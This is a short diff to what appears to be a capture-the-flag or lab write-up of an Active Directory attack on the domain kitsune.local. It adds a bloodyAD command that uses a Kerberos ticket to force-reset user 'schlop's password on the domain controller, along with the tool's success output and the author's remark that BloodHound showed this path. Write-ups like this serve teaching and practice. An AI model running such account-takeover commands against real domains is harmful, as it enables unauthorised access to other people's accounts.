@@ -343,6 +343,13 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have a TGT for the user, this TGT should contain the SID of the helpdesk group
 
 ```python
+❯❯❯ bloodyAD --host dc01.kitsune.local -d kitsune.local -k set password 'schlop' 'Password123!'
+[+] Password changed successfully!
+```
+
+Ill then just change the password of the user like bloodhound said i could do
+
+```python
 
 ```
 
